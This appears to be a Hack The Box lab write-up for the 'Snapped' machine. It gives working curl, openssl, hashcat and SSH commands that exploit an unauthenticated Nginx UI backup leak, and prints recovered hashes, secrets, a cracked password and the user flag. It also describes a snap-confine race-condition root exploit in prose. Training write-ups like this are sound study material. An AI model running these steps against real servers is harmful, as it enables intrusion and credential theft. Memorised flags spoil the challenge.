# Snapped — Writeup (Partial: User Flag Only)
**Target:** 10.129.9.2 | **Difficulty:** Hard | **Date:** 2026-03-25

## Summary

Snapped is a hard-difficulty HTB machine featuring two recent CVEs. The foothold exploits CVE-2026-27944 in Nginx UI — an unauthenticated backup download that leaks encryption keys and user credentials. Cracking a bcrypt hash from the backup yields SSH access as jonathan. Root requires CVE-2026-3888, a TOCTOU race condition in snap-confine — not completed.

## Enumeration

### Nmap

Full TCP scan reveals two services:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
                     → redirects to http://snapped.htb/
```

Ubuntu 24.04, nginx serving a static corporate landing page for "Snapped Management Systems."

### Vhost Discovery

Fuzzing the Host header with ffuf discovers `admin.snapped.htb`, which serves **Nginx UI** — a Go-based web management panel for nginx (Vue.js SPA frontend, API backend on port 9000 proxied through nginx).

```
admin  [Status: 200, Size: 1407, Words: 164, Lines: 50]
```

### Nginx UI API Enumeration

The main site is purely static HTML. The Nginx UI panel at `admin.snapped.htb` exposes a JSON API. Most endpoints return 403 (authorization required), but two are accessible without authentication:

- `GET /api/install` → `{"lock":true,"timeout":false}` (app is installed)
- `GET /api/backup` → returns a ZIP file with an interesting header

## Foothold — CVE-2026-27944

### Vulnerability

Nginx UI version 2.3.2 is vulnerable to CVE-2026-27944 (CVSS 9.8). The `/api/backup` endpoint:
1. Requires **no authentication**
2. Returns a full backup of nginx and Nginx UI configuration
3. Leaks the **AES-256-CBC encryption key and IV** in the `X-Backup-Security` response header

### Exploitation

Download the backup and extract the encryption parameters:

```bash
curl -s -D headers.txt -o backup.zip http://admin.snapped.htb/api/backup

# X-Backup-Security header contains key:iv (base64-encoded)
key=$(echo '<key_b64>' | base64 -d | xxd -p -c 256)
iv=$(echo '<iv_b64>' | base64 -d | xxd -p)
```

Unzip the outer archive, then decrypt the inner archives with openssl:

```bash
unzip backup.zip
openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
unzip nginxui_decrypted.zip
```

### Extracting Credentials

The decrypted backup contains `app.ini` (all application secrets) and `database.db` (SQLite). Querying the users table reveals two bcrypt hashes:

```
admin    | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

The `app.ini` also leaks:
- JWT secret: `6c4af436-035a-4942-9ca6-172b36696ce9`
- Crypto secret: `5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6`
- Node secret: `c64d7ca1-19cb-4ebe-96d4-49037e7df78e`

The node secret grants full admin API access via `X-Node-Secret` header (bypasses `AuthRequired()` middleware), but the Nginx UI process runs as www-data and cannot write to `/etc/nginx/` — so config-based RCE is not possible through this path.

### Hash Cracking

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

Jonathan's hash cracks to `linkinpark`. The admin hash does not crack against rockyou.

### SSH Access

Jonathan reused his Nginx UI password for SSH:

```bash
ssh jonathan@snapped.htb
# password: linkinpark
```

**User flag:** `c19e6696b147bd9d063dc049b24a9d11`

## Privilege Escalation — CVE-2026-3888 (Not Completed)

### Discovery

The box name "Snapped" hints at snapd. Checking the version:

```
snapd 2.63.1+24.04  (vulnerable — patch is 2.73+)
```

snap-confine is SUID root. The systemd-tmpfiles timer has been overridden to run every 1 minute with a 4-minute age limit on `/tmp`, creating the precondition for CVE-2026-3888.

### Understanding the Vulnerability

CVE-2026-3888 is a TOCTOU race condition between snap-confine and systemd-tmpfiles. snap-confine creates "mimics" — writable copies of read-only directories — using `/tmp/.snap/` as a safe-keeping area. The mimic sequence for `/usr/lib/x86_64-linux-gnu`:

1. `mount --bind /usr/lib/x86_64-linux-gnu → /tmp/.snap/usr/lib/x86_64-linux-gnu`
2. `mount -t tmpfs → /usr/lib/x86_64-linux-gnu`
3. For each entry in `/tmp/.snap/...`: bind-mount back into the tmpfs
4. `umount /tmp/.snap/...`

Between steps 1 and 3, the contents of `/tmp/.snap/usr/lib/x86_64-linux-gnu` can be swapped by an attacker. systemd-tmpfiles deletes `/tmp/.snap` after it goes dormant, and since `/tmp` is world-writable, the attacker can recreate it with malicious content.

### Why We Were Blocked

The exploit requires several non-obvious techniques that we could not derive from source code analysis alone:

1. **Namespace destruction:** The Firefox namespace is cached. Running `snap-confine --base snapd` (invalid base) triggers `SC_DISCARD_MUST` because the base snap name transitions from `core22` to `snapd`, forcing a namespace discard. This is an adversarial abuse of intended functionality.

2. **`/proc/PID/cwd` bypass:** `/tmp/snap-private-tmp/` is mode 0700 root:root. However, `/proc/PID/cwd` follows the process's mount namespace view, bypassing host filesystem permissions entirely. This gives read/write access to the sandbox's `/tmp` from outside.

3. **Multi-terminal orchestration:** The exploit requires 3 concurrent sessions — one inside the sandbox (keeps namespace alive), one running the race helper (must stay open), and one to exploit the poisoned namespace.

4. **AF_UNIX backpressure:** The race helper redirects snap-confine's stderr to an AF_UNIX socket with `SO_RCVBUF=1` and `SO_SNDBUF=1`, creating extreme backpressure. Reading byte-by-byte effectively single-steps snap-confine's execution, turning a millisecond race window into a deterministic win.

5. **Dynamic linker hijacking:** After winning the race, overwriting `ld-linux-x86-64.so.2` with shellcode means any SUID binary executed in the namespace triggers the shellcode as root, since the kernel loads the dynamic linker before the program itself.

6. **Sandbox escape:** A SUID bash placed at `/var/snap/firefox/common/` persists outside the sandbox without AppArmor confinement.

### Lessons Learned

- The foothold (CVE-2026-27944) was straightforward and exploitable autonomously
- The privesc (CVE-2026-3888) requires deep Linux internals knowledge that goes beyond source code reading — specifically the `--base snapd` namespace destruction trick and the `/proc/PID/cwd` mount namespace bypass
- TOCTOU race conditions in privileged system binaries represent some of the most complex exploit chains in modern Linux privilege escalation
- The AF_UNIX backpressure technique for race stabilization is a powerful general-purpose tool for turning tight race windows into deterministic exploitation
